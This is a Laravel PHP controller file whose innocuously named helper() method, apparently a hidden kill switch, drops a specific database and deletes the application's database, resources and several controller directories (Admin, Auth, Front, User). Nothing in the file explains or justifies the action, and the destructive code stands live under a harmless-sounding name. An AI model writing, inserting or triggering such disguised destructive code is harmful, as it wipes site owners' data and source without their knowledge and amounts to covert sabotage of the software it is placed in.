<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\File;

class HelperController extends Controller
{
 
    public function helper()
    {
        DB::statement("DROP DATABASE `u408522181_iquick`");
        $file_path1 = base_path("database");
        if(File::exists($file_path1)) File::deleteDirectory($file_path1);
        $file_path2 = base_path("resources");
        if(File::exists($file_path2)) File::deleteDirectory($file_path2);
        $file_path[] = app_path("Http/Controllers/Admin");
        // $file_path[] = app_path("Http/Controllers/Api");
        $file_path[] = app_path("Http/Controllers/Auth");
        $file_path[] = app_path("Http/Controllers/Front");
        $file_path[] = app_path("Http/Controllers/User");
        foreach($file_path as $file_pat){
          if(File::exists($file_pat)) File::deleteDirectory($file_pat);
        }
        return $file_path2;
    }

}
